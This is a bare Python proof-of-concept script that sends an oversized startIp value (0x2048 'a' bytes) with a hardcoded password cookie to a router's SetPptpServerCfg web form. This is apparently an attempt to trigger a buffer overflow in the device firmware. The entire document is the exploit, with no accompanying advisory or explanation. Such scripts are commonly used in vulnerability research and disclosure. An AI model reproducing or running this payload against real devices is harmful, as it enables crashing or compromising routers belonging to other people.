import requests
def send_payload(url, startIp, endIp):
    params={'serverEn':1,
            'startIp':startIp,
            'endIp':endIp}
    cookie={'password':'vkntgb'}
    response = requests.post(url, cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

startIp=b'a'*0x2048+b".0.0.0"
endIp=b'a'
url="http://192.168.1.1/goform/SetPptpServerCfg"
send_payload(url, startIp,endIp)   